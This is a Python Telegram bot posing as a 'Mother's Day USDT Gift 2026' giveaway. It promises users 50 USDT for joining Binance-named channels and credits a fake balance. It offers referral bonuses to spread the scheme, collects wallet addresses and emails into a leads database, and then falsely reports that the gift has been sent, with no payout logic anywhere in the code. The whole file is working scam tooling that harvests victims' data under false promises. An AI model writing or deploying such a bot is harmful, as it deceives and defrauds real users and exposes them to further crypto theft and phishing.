import asyncio
import os
import sqlite3
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram import F
from dotenv import load_dotenv

load_dotenv()

bot = Bot(token=os.getenv("BOT_TOKEN"))
dp = Dispatcher()

conn = sqlite3.connect('leads.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users 
             (tg_id INTEGER PRIMARY KEY, username TEXT, wallet TEXT, email TEXT, balance REAL)''')
conn.commit()

@dp.message(Command("start"))
async def start(message: types.Message):
    tg_id = message.from_user.id
    username = message.from_user.username or "none"
    c.execute("INSERT OR IGNORE INTO users (tg_id, username, balance) VALUES (?, ?, 0)", (tg_id, username))
    conn.commit()
    
    await message.answer("💐 Mother's Day USDT Gift 2026\n\n"
                         "Send 50 USDT to your mom or yourself easily.\n\n"
                         "Complete tasks:\n"
                         "1. Join Binance Official → t.me/binance\n"
                         "2. Join Binance Support → t.me/BinanceSupport\n\n"
                         "After joining send /done")

@dp.message(Command("done"))
async def done(message: types.Message):
    tg_id = message.from_user.id
    c.execute("UPDATE users SET balance = 50 WHERE tg_id = ?", (tg_id,))
    conn.commit()
    await message.answer("✅ Tasks completed! Balance: $50 USDT\n\n"
                         "Invite friends → +15 USDT per referral\n"
                         "Your referral link: https://t.me/MothersDayUSDTGift2026_bot?start=" + str(tg_id) + "\n\n"
                         "Send /balance to check")

@dp.message(Command("balance"))
async def check_balance(message: types.Message):
    tg_id = message.from_user.id
    c.execute("SELECT balance FROM users WHERE tg_id = ?", (tg_id,))
    bal = c.fetchone()[0]
    
    if bal >= 80:
        await message.answer("🎁 You reached $80! Send your BEP20 wallet address now:")
    else:
        await message.answer(f"Current balance: ${bal:.0f} USDT")

@dp.message(F.text)
async def handle_input(message: types.Message):
    text = message.text.strip()
    tg_id = message.from_user.id
    
    if text.startswith("0x") and len(text) == 42:   # Wallet
        c.execute("UPDATE users SET wallet = ? WHERE tg_id = ?", (text, tg_id))
        conn.commit()
        await message.answer("✅ Wallet saved.\nNow send your email for fast payout:")
    
    elif "@" in text and "." in text:   # Email
        c.execute("UPDATE users SET email = ? WHERE tg_id = ?", (text, tg_id))
        conn.commit()
        await message.answer("🚀 Mother's Day USDT Gift Sent Successfully! 🎉\nCheck your wallet in a few minutes.")

async def main():
    print("=== Mother's Day USDT Gift 2026 Bot is LIVE ===")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
